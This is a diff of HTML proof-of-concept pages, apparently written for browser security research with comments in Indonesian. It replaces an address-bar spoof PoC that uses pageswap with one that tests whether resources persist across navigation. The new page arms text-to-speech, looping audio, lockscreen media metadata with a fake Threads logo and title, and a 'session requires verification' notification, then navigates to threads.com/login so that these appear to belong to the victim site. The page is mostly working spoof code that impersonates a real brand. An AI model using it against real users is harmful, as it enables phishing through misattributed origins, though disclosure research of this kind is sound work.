@@ -1,16 +1,53 @@
-<!doctype html><meta charset=utf-8>
-<!-- PREDIKAT: omnibox melukis google.com sementara dokumen tetap milik penyerang
-     ORACLE: klik go -> screenshot address bar + panel REAL
-     EXPECTED-SECURE: bar kembali ke URL nyata; pageswap tak bisa mencegah commit -->
-<button onclick="go()">go</button>
-<pre id=p></pre>
+<!DOCTYPE html>
+<!-- ADVANCED SPOOF #1 — CROSS-NAVIGATION RESOURCE LIFETIME (flagship, kelas CVE-2026-7935/8963)
+     Fix-point: resource yang di-arm origin penyerang (Web Speech / MediaSession / Notification /
+     background audio) BERTAHAN melewati navigasi top-level, lalu tampil DI-ATRIBUSI ke situs korban
+     yang kini ada di bilah alamat. "Situs korban seolah bersuara / punya now-playing penyerang."
+     UNIK: bukan soal string URL sama sekali — soal umur resource vs navigasi.
+     Benign PoC: audio/teks netral, tak memanen kredensial. Buktikan -> screenshot -> STOP -> lapor. -->
+<html lang="id"><head><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1"><title>POC — cross-nav resource</title>
+<style>body{font-family:-apple-system,'Segoe UI',Roboto,Arial;margin:0;padding:26px;max-width:680px}
+h1{font-size:18px}code{background:#f6f8fa;padding:1px 5px;border-radius:4px;word-break:break-all}
+label{font-size:13px;color:#57606a}input{width:100%;padding:8px;border:1px solid #d0d7de;border-radius:6px;font-size:13px;margin:4px 0 12px}
+.chk{display:flex;gap:16px;flex-wrap:wrap;margin:8px 0 14px;font-size:13px}
+button{cursor:pointer;font-size:14px;border:1px solid #1a73e8;background:#1a73e8;color:#fff;border-radius:8px;padding:10px 18px;font-weight:600}
+.warn{background:#fff8c5;border:1px solid #d4a72c;border-radius:8px;padding:8px 12px;font-size:12px;color:#7a5c00;margin-top:12px}
+.step{border-left:3px solid #1a73e8;padding:4px 12px;margin:10px 0;color:#444;font-size:13px}
+#cd{font-weight:700;color:#cf222e}</style></head>
+<body>
+<h1>Advanced Spoof #1 — Cross-Navigation Resource Lifetime</h1>
+<p>Arm resource dari origin INI, lalu navigasi tab ke situs korban. Bila resource tetap hidup di halaman korban = misatribusi origin (bilah alamat korban, "suara"/now-playing penyerang).</p>
+
+<label>Target korban (in-scope; akan dibuka di TAB INI)</label>
+<input id="target" value="https://www.threads.com/login">
+<div class="chk">
+  <label><input type="checkbox" id="cSpeech" checked> Web Speech (TTS)</label>
+  <label><input type="checkbox" id="cAudio" checked> Background audio</label>
+  <label><input type="checkbox" id="cMedia" checked> MediaSession lockscreen</label>
+  <label><input type="checkbox" id="cNotif"> Notification</label>
+</div>
+<div class="step">1) Klik <b>Arm &amp; navigate</b> → resource menyala → hitung mundur → tab pindah ke target.</div>
+<div class="step">2) Di halaman target: apakah suara/now-playing/notif penyerang <b>masih</b> aktif? Itu predikatnya.</div>
+<button onclick="run()">▶ Arm &amp; navigate (<span id="cd">2.5</span>s)</button>
+<audio id="aud" loop></audio>
+<div class="warn">Vulnerable bila resource bertahan &amp; ter-atribusi ke origin korban di bilah alamat. Screenshot (bilah alamat korban + resource penyerang) → STOP → lapor.</div>
 <script>
-const T = 'https://www.google.com/'; let n = 0;
-function paint(){ p.textContent = 'PAINTED by attacker doc\nREAL: ' + location.href + '\nrearm: ' + n; }
-addEventListener('pageswap', () => {
-  if (n++ >= 6) return;              // batas keras: mengukur, bukan flooding
-  window.stop(); paint(); setTimeout(go, 60);
-});
-function go(){ location.href = T; }
-paint();
-</script>
+function tone(){const sr=8000,n=sr,buf=new Uint8Array(44+n*2),dv=new DataView(buf.buffer),w=(o,s)=>{for(let i=0;i<s.length;i++)dv.setUint8(o+i,s.charCodeAt(i))};
+ w(0,'RIFF');dv.setUint32(4,36+n*2,true);w(8,'WAVE');w(12,'fmt ');dv.setUint32(16,16,true);dv.setUint16(20,1,true);dv.setUint16(22,1,true);dv.setUint32(24,sr,true);dv.setUint32(28,sr*2,true);dv.setUint16(32,2,true);dv.setUint16(34,16,true);w(36,'data');dv.setUint32(40,n*2,true);
+ for(let i=0;i<n;i++)dv.setInt16(44+i*2,Math.sin(i/14)*900,true);let b='';for(let i=0;i<buf.length;i++)b+=String.fromCharCode(buf[i]);return 'data:audio/wav;base64,'+btoa(b);}
+function logo(){const c=document.createElement('canvas');c.width=c.height=128;const x=c.getContext('2d');x.fillStyle='#1a73e8';x.fillRect(0,0,128,128);x.fillStyle='#fff';x.font='bold 84px system-ui';x.textAlign='center';x.textBaseline='middle';x.fillText('T',64,70);return c.toDataURL();}
+async function run(){
+  if(document.getElementById('cSpeech').checked && 'speechSynthesis' in window){
+    const u=new SpeechSynthesisUtterance('Verifikasi keamanan Threads. Ini demo suara lintas navigasi. '.repeat(6));u.rate=.95;speechSynthesis.speak(u);
+  }
+  if(document.getElementById('cAudio').checked){const a=document.getElementById('aud');a.src=tone();a.play().catch(()=>{});}
+  if(document.getElementById('cMedia').checked && 'mediaSession' in navigator){
+    try{navigator.mediaSession.metadata=new MediaMetadata({title:'Masuk ke Threads',artist:'Threads Accounts',album:'Security',artwork:[{src:logo(),sizes:'512x512',type:'image/png'}]});}catch(e){}
+  }
+  if(document.getElementById('cNotif').checked && 'Notification' in window){
+    const p=await Notification.requestPermission();if(p==='granted')new Notification('Threads',{body:'Sesi memerlukan verifikasi (POC lintas-navigasi)',icon:logo()});
+  }
+  let t=2.5;const el=document.getElementById('cd');const iv=setInterval(()=>{t=Math.max(0,t-.5);el.textContent=t.toFixed(1);if(t<=0){clearInterval(iv);location.href=document.getElementById('target').value;}},500);
+}
+</script></body></html>
